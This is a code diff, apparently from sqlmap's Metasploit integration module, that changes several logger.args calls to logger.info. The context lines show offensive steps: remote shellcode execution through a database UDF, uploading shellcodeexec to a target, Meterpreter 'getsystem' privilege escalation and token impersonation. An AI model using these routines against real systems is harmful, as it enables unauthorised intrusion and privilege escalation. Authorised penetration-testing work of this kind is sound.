@@ -185,7 +185,7 @@ class Metasploit(object):
             infoMsg += "it is the only payload that can be used to "
             infoMsg += "escalate privileges via 'incognito' extension, "
             infoMsg += "'getsystem' command or post modules"
-            logger.args(infoMsg)
+            logger.info(infoMsg)
 
             _payloadStr = "windows/meterpreter"
         else:
@@ -417,7 +417,7 @@ class Metasploit(object):
 
         infoMsg = "running Metasploit Framework command line "
         infoMsg += "interface locally, please wait.."
-        logger.args(infoMsg)
+        logger.info(infoMsg)
 
         logger.debug("executing local command: %s" % self._cliCmd)
         self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)
@@ -427,7 +427,7 @@ class Metasploit(object):
 
         infoMsg = "running Metasploit Framework command line "
         infoMsg += "interface locally, please wait.."
-        logger.args(infoMsg)
+        logger.info(infoMsg)
 
         logger.debug("executing local command: %s" % self._cliCmd)
         self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, close_fds=False)
@@ -435,14 +435,14 @@ class Metasploit(object):
     def _runMsfShellcodeRemote(self):
         infoMsg = "running Metasploit Framework shellcode "
         infoMsg += "remotely via UDF 'sys_bineval', please wait.."
-        logger.args(infoMsg)
+        logger.info(infoMsg)
 
         self.udfExecCmd("'%s'" % self.shellcodeString, silent=True, udfName="sys_bineval")
 
     def _runMsfShellcodeRemoteViaSexec(self):
         infoMsg = "running Metasploit Framework shellcode remotely "
         infoMsg += "via shellcodeexec, please wait.."
-        logger.args(infoMsg)
+        logger.info(infoMsg)
 
         if not Backend.isOs(OS.WINDOWS):
             self.execCmd("chmod +x %s" % self.shellcodeexecRemote, silent=True)
@@ -474,7 +474,7 @@ class Metasploit(object):
             infoMsg = "trying to escalate privileges using Meterpreter "
             infoMsg += "'getsystem' command which tries different "
             infoMsg += "techniques, including kitrap0d"
-            logger.args(infoMsg)
+            logger.info(infoMsg)
 
             send_all(proc, "getsystem\n")
 
@@ -482,7 +482,7 @@ class Metasploit(object):
             infoMsg += "Choose which user you want to impersonate by "
             infoMsg += "using incognito's command 'impersonate_token' if "
             infoMsg += "'getsystem' does not success to elevate privileges"
-            logger.args(infoMsg)
+            logger.info(infoMsg)
 
             send_all(proc, "list_tokens -u\n")
             send_all(proc, "getuid\n")
@@ -589,7 +589,7 @@ class Metasploit(object):
 
     def createMsfShellcode(self, exitfunc, format, extra, encode):
         infoMsg = "creating Metasploit Framework multi-stage shellcode "
-        logger.args(infoMsg)
+        logger.info(infoMsg)
 
         self._randStr = randomStr(lowercase=True)
         self._shellcodeFilePath = os.path.join(conf.outputPath, "tmpm%s" % self._randStr)
@@ -646,7 +646,7 @@ class Metasploit(object):
         self.shellcodeexecRemote = "%s/%s" % (conf.tmpPath, __basename)
         self.shellcodeexecRemote = ntToPosixSlashes(normalizePath(self.shellcodeexecRemote))
 
-        logger.args("uploading shellcodeexec to '%s'" % self.shellcodeexecRemote)
+        logger.info("uploading shellcodeexec to '%s'" % self.shellcodeexecRemote)
 
         if web:
             written = self.webUpload(self.shellcodeexecRemote, os.path.split(self.shellcodeexecRemote)[0], filepath=self.shellcodeexecLocal)
@@ -662,7 +662,7 @@ class Metasploit(object):
 
             return False
         else:
-            logger.args("shellcodeexec successfully uploaded")
+            logger.info("shellcodeexec successfully uploaded")
             return True
 
     def pwn(self, goUdf=False):
